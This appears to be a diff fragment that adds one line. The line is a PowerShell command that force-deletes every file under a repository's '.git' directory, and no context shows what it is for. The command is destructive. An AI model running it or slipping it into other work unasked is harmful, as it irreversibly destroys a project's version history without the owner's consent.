@@ -1,0 +1,1 @@
+powershell -Command "& {Get-ChildItem -Path '.git' -Recurse -File | Remove-Item -Force}"
